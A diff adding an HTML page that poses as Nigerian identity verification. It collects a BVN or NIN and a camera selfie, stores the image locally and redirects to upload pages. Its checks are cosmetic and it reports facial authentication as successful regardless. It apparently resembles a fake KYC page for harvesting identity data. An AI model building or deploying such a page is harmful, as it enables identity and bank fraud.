@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Identity Verification</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+body{background:#000;color:#fff}
+.page{display:none;min-height:100vh}
+.page.active{display:block}
+
+/* ===== PAGE 1 ===== */
+.top-bar {
+    display: flex;
+    align-items: center;
+    justify-content: center; /* center the text */
+    padding: 25px 20px;
+    font-size: 23px;
+    font-weight: 700;
+    position: relative; /* allows back arrow to stay left */
+}
+
+    .verify-title {
+    text-align: center; /* center header */
+}
+
+.verify-sub {
+    text-align: center; /* center subtitle */
+}
+    
+    .non-doc-header {
+    text-align: center;
+}
+
+.non-doc-sub {
+    text-align: center;
+}
+    
+.top-bar .back-arrow {
+    position: absolute;
+    left: 20px; /* back arrow on the left */
+    font-size: 26px;
+    cursor: pointer;
+}
+.back-arrow{font-size:26px;margin-right:10px}
+.warning-box{background:#3a280e;color:#ffbc6c;padding:15px;border-left:4px solid orange;font-size:13px}
+.container{padding:20px}
+.label{font-size:14px;margin-bottom:8px;color:#ccc}
+.select-box{background:#1b1b1b;padding:14px;border-radius:10px;display:flex;gap:10px;margin-bottom:25px}
+.select-box img{width:24px}
+
+.card{background:#0d0d0d;border:2px solid #3c3c3c;padding:18px;border-radius:10px;margin-bottom:18px;font-size:17px;cursor:pointer;display:flex;gap:10px;position:relative}
+.card .icon{background:#1b1b1b;padding:6px 14px;border-radius:6px;font-weight:bold}
+.card.selected{background:#fff;color:#000;border-color:#ff9f22}
+.card.selected .icon{background:#fff;border:2px solid #ff9f22}
+.recommended-text{position:absolute;right:15px;top:8px;font-size:12px;color:#ff8a00;font-weight:600}
+
+.confirm-btn{position:fixed;bottom:15px;left:5%;width:90%;background:#ff9f22;border:none;border-radius:30px;padding:16px;font-size:18px;font-weight:700}
+.popup{position:fixed;top:20px;right:20px;background:#ff3b3b;color:#fff;padding:12px 18px;border-radius:8px;display:none}
+
+/* ===== PAGE 2 ===== */
+.verify-page{background:#fff;color:#000;padding:25px 20px}
+.verify-title{font-size:22px;font-weight:700}
+.verify-sub{font-size:14px;color:#666;margin-bottom:25px}
+.verify-card{border-radius:12px;padding:18px;border:1px solid #e5e5e5;margin-bottom:15px;display:flex;gap:12px}
+.verify-card .icon{width:32px;height:32px;border-radius:50%;background:#f2f2f2;display:flex;align-items:center;justify-content:center}
+
+.continue-btn{position:fixed;bottom:20px;left:5%;width:90%;background:#1e66ff;color:#fff;border:none;border-radius:12px;padding:16px;font-size:17px;font-weight:600}
+.powered{position:fixed;bottom:80px;width:100%;text-align:center;font-size:12px;color:#999}
+
+/* ===== PAGE 3 ===== */
+.non-doc{background:#fff;color:#000;padding:20px}
+.non-doc-header{font-size:20px;font-weight:700;margin-bottom:10px}
+.non-doc-sub{font-size:14px;color:#666;margin-bottom:25px}
+.field-label{font-size:14px;margin-bottom:6px}
+.input-box{background:#f2f2f2;border-radius:10px;padding:14px;margin-bottom:20px}
+.input-box input{width:100%;border:none;background:transparent;font-size:15px;outline:none}
+.country-box{display:flex;gap:10px}
+.country-box img{width:26px}
+
+.submit-btn{position:fixed;bottom:20px;left:5%;width:90%;background:#1e66ff;color:#fff;border:none;border-radius:12px;padding:16px;font-size:17px;font-weight:600}
+.footer{position:fixed;bottom:70px;width:100%;text-align:center;font-size:12px;color:#999}
+
+/* ===== FACE SCAN ===== */
+#faceScan video{width:100%;height:100vh;object-fit:cover}
+.scan-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:flex;flex-direction:column;justify-content:space-between;padding:25px}
+.scan-title{text-align:center;font-size:18px}
+
+.face-circle{
+  width:380px;
+  height:380px;
+  border:4px solid #1e66ff;
+  border-radius:50%;
+  margin:auto;
+  box-shadow:0 0 0 9999px rgba(0,0,0,.75);
+  transition:.4s
+}
+.face-circle.success{border-color:#1ad760}
+
+.capture-btn{
+  background:#1e66ff;
+  color:#fff;
+  border:none;
+  border-radius:12px;
+  padding:16px;
+  font-size:16px;
+  font-weight:600;
+  width:100%
+}
+
+/* ===== CONFIRM POPUP ===== */
+.confirm-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.7);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:20
+}
+.confirm-box{
+  background:#fff;
+  color:#000;
+  width:85%;
+  border-radius:14px;
+  padding:20px;
+  text-align:center
+}
+.confirm-actions{
+  display:flex;
+  gap:10px;
+  margin-top:20px
+}
+.confirm-actions button{
+  flex:1;
+  padding:14px;
+  border:none;
+  border-radius:10px;
+  font-size:15px;
+  font-weight:600
+}
+.rescan-btn{background:#e5e5e5}
+.submit-face-btn{background:#1e66ff;color:#fff}
+
+.success-popup{
+  position:fixed;
+  top:20px;
+  right:20px;
+  background:#1ad760;
+  color:#fff;
+  padding:12px 18px;
+  border-radius:8px;
+  display:none;
+  font-weight:600;
+  z-index:30
+}
+  .verify-card {
+  border-radius:12px;
+  padding:18px;
+  border:1px solid #e5e5e5;
+  margin-bottom:15px;
+  display:flex;
+  align-items:center;
+  gap:12px;
+}
+
+.verify-card .icon {
+  width:32px;
+  height:32px;
+  border-radius:50%;
+  background:#f2f2f2;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+  flex-shrink:0;
+}
+
+  .level-back-header{
+  position: fixed;
+  top: 12px;
+  left: 12px;
+  z-index: 2000;
+  background: #ffffff;
+  border-radius: 50%;
+  width: 44px;
+  height: 44px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 4px 12px rgba(0,0,0,.25);
+}
+
+.level-back-header i{
+  font-size:28px;
+  font-weight:900;
+  cursor:pointer;
+  color:#000;
+}
+
+.level-back-header i:active{
+  transform: translateY(2px) scale(0.95);
+  opacity:0.7;
+}
+  
+.verify-card div { /* wrapper for title and sub */
+  display:flex;
+  flex-direction:column;
+}
+
+.verify-card-title {
+  font-size:16px;   /* title slightly smaller than main heading */
+  font-weight:600;
+}
+
+.verify-card-sub {
+  font-size:13px;  /* tiny text for subtitle */
+  color:#666;
+  margin-top:4px;
+}
+    .level-back-header{
+  pointer-events: auto;
+}
+
+.scan-overlay{
+  pointer-events: none;
+}
+
+.scan-overlay button{
+  pointer-events: auto;
+}
+    .level-back-header{
+  z-index: 99999;
+  pointer-events: auto;
+}
+</style>
+</head>
+
+<body>
+
+<!-- PAGE 1 -->
+<div class="page active" id="page1">
+ <div class="top-bar">Proof of Identity</div>
+  <div class="warning-box">Due to insufficient phone memory, you may not be able to complete this verification process.</div>
+  <div class="container">
+    <label class="label">Document issuing country</label>
+    <div class="select-box"><img src="https://flagcdn.com/w40/ng.png">Nigeria</div>
+    <label class="label">Quick verification</label>
+    <div class="card" id="bvn"><span class="icon">BVN</span><span class="recommended-text">Recommended</span></div>
+    <div class="card" id="nin"><span class="icon">NIN</span><span class="recommended-text">Recommended</span></div>
+  </div>
+  <button class="confirm-btn" onclick="confirmSelection()">Confirm</button>
+  <div class="popup" id="popup">❌ Please select BVN or NIN</div>
+</div>
+
+<!-- ===== PAGE 2 ===== -->  
+<div class="page verify-page" id="page2">  
+
+  <div class="verify-title">Verify your identity</div>  
+  <div class="verify-sub">It will only take 2 minutes</div>  
+
+  <!-- Non-Doc Verification -->
+  <div class="verify-card">  
+    <div class="icon">⏱</div>  
+    <div>
+      <div class="verify-card-title">Non-Doc Verification</div>
+      <div class="verify-card-sub">Complete your data verification</div>
+    </div>  
+  </div>  
+
+    <canvas id="faceCanvas" style="display:none;"></canvas>
+    
+  <!-- Selfie -->
+  <div class="verify-card">  
+    <div class="icon">📷</div>  
+    <div>
+      <div class="verify-card-title">Selfie</div>
+      <div class="verify-card-sub">Take a selfie</div>
+    </div>  
+  </div>  
+
+  <div class="powered">Powered by NFN</div>  
+  <button class="continue-btn" id="goNonDoc">Continue</button>  
+</div>
+
+  <div class="level-back-header">
+  <i class="fa-solid fa-chevron-left" id="goBack"></i>
+  </div>
+    
+<!-- PAGE 3 -->
+<div class="page non-doc" id="page3">
+  <div class="non-doc-header">← Non-Doc Verification</div>
+  <div class="non-doc-sub">Provide your data</div>
+  <div class="field-label">Country *</div>
+  <div class="input-box country-box"><img src="https://flagcdn.com/w40/ng.png">Nigeria</div>
+  <div class="field-label">NIN *</div>
+  <div class="input-box"><input type="text" placeholder="required"></div>
+  <div class="footer">Powered by NFN</div>
+  <button class="submit-btn">Continue</button>
+</div>
+    
+    <!-- BVN PAGE -->
+<div class="page non-doc" id="pageBVN">
+  <div class="non-doc-header">BVN Verification</div>
+  <div class="non-doc-sub">Provide your BVN</div>
+
+  <div class="field-label">Country *</div>
+  <div class="input-box country-box">
+    <img src="https://flagcdn.com/w40/ng.png">Nigeria
+  </div>
+
+  <div class="field-label">BVN *</div>
+  <div class="input-box">
+    <input type="text" id="bvnInput" placeholder="Enter 11-digit BVN">
+  </div>
+
+  <div class="footer">Powered by NFN</div>
+  <button class="submit-btn" id="submitBVN">Continue</button>
+</div>
+
+<!-- FACE SCAN -->
+<div class="page" id="faceScan">
+  <video id="frontCam" autoplay muted playsinline></video>
+  <div class="scan-overlay">
+    <div class="scan-title">Position your face in the circle</div>
+    <div class="face-circle" id="faceCircle"></div>
+    <button class="capture-btn" id="captureFace">I have positioned my face in the frame</button>
+  </div>
+</div>
+
+<!-- CONFIRM POPUP -->
+<div class="confirm-overlay" id="confirmPopup">
+  <div class="confirm-box">
+    <h3>Is your face in the frame correctly?</h3>
+    <div class="confirm-actions">
+      <button class="rescan-btn" id="rescanFace">Rescan face</button>
+      <button class="submit-face-btn" id="submitFace">Submit facial authentication</button>
+    </div>
+  </div>
+</div>
+
+<div class="success-popup" id="faceSuccess">✅ Facial authentication successful</div>
+<div id="ninError" class="popup">❌ Invalid NIN,CHECK YOUR NIN AND TRY AGAIN </div>
+<div id="bvnError" class="popup">❌ Invalid BVN, CHECK YOUR BVN AND TRY AGAIN </div>
+
+<script>
+/* ========= PAGES ========= */
+const page1 = document.getElementById("page1");
+const page2 = document.getElementById("page2");
+const pageNIN = document.getElementById("page3");
+const pageBVN = document.getElementById("pageBVN");
+const faceScan = document.getElementById("faceScan");
+
+/* ========= UI ========= */
+const popup = document.getElementById("popup");
+const popupNIN = document.getElementById("ninError");
+const popupBVN = document.getElementById("bvnError");
+
+/* ========= STATE ========= */
+let selectedType = null;
+let cameraStream = null;
+
+/* ========= SELECT CARDS ========= */
+const ninCard = document.getElementById("nin");
+const bvnCard = document.getElementById("bvn");
+
+ninCard.onclick = () => {
+  selectedType = "nin";
+  ninCard.classList.add("selected");
+  bvnCard.classList.remove("selected");
+};
+
+bvnCard.onclick = () => {
+  selectedType = "bvn";
+  bvnCard.classList.add("selected");
+  ninCard.classList.remove("selected");
+};
+
+/* ========= CONFIRM ========= */
+function confirmSelection(){
+  if(!selectedType){
+    popup.style.display = "block";
+    setTimeout(() => popup.style.display = "none", 2000);
+    return;
+  }
+  page1.classList.remove("active");
+  page2.classList.add("active");
+}
+
+/* ========= CONTINUE ========= */
+document.getElementById("goNonDoc").onclick = () => {
+  page2.classList.remove("active");
+  selectedType === "nin"
+    ? pageNIN.classList.add("active")
+    : pageBVN.classList.add("active");
+};
+
+/* ========= NIN SUBMIT ========= */
+pageNIN.querySelector(".submit-btn").onclick = () => {
+  const nin = pageNIN.querySelector("input").value.trim();
+  if(!/^\d{11}$/.test(nin)){
+    popupNIN.style.display = "block";
+    setTimeout(() => popupNIN.style.display = "none", 2000);
+    return;
+  }
+  openFaceScan("nin");
+};
+
+/* ========= BVN SUBMIT ========= */
+document.getElementById("submitBVN").onclick = () => {
+  const bvn = document.getElementById("bvnInput").value.trim();
+  if(!/^\d{11}$/.test(bvn)){
+    popupBVN.style.display = "block";
+    setTimeout(() => popupBVN.style.display = "none", 2000);
+    return;
+  }
+  openFaceScan("bvn");
+};
+
+/* ========= OPEN FACE SCAN ========= */
+async function openFaceScan(type){
+  pageNIN.classList.remove("active");
+  pageBVN.classList.remove("active");
+  faceScan.classList.add("active");
+
+  faceScan.dataset.from = type;
+
+  try{
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:"user" }
+    });
+    document.getElementById("frontCam").srcObject = cameraStream;
+  }catch(err){
+    alert("Camera access denied");
+  }
+}
+
+/* ========= FACE CAPTURE ========= */
+document.getElementById("captureFace").onclick = () => {
+  const video = document.getElementById("frontCam");
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  // Capture frame
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // Convert to image
+  const faceImage = canvas.toDataURL("image/jpeg", 0.9);
+
+  // Store image (for upload later)
+  localStorage.setItem("faceImage", faceImage);
+
+  // UI success
+  document.getElementById("faceCircle").classList.add("success");
+  document.getElementById("faceSuccess").style.display = "block";
+
+  // Stop camera
+  if(cameraStream){
+    cameraStream.getTracks().forEach(t => t.stop());
+    cameraStream = null;
+  }
+
+  // Continue flow
+  setTimeout(() => {
+    window.location.href =
+      faceScan.dataset.from === "bvn"
+        ? "bvn-upload.html"
+        : "nin-upload.html";
+  }, 1200);
+};
+
+/* ========= BACK BUTTON ========= */
+document.getElementById("goBack").onclick = () => {
+
+  // If face scan active
+  if(faceScan.classList.contains("active")){
+    faceScan.classList.remove("active");
+
+    if(cameraStream){
+      cameraStream.getTracks().forEach(t => t.stop());
+      cameraStream = null;
+    }
+
+    faceScan.dataset.from === "bvn"
+      ? pageBVN.classList.add("active")
+      : pageNIN.classList.add("active");
+    return;
+  }
+
+  // BVN → Page 2
+  if(pageBVN.classList.contains("active")){
+    pageBVN.classList.remove("active");
+    page2.classList.add("active");
+    return;
+  }
+
+  // NIN → Page 2
+  if(pageNIN.classList.contains("active")){
+    pageNIN.classList.remove("active");
+    page2.classList.add("active");
+    return;
+  }
+
+  // Page 2 → Page 1
+  if(page2.classList.contains("active")){
+    page2.classList.remove("active");
+    page1.classList.add("active");
+    return;
+  }
+
+  // Exit flow
+  window.location.href = "my project.html";
+};
+</script>
+</body>
+</html>
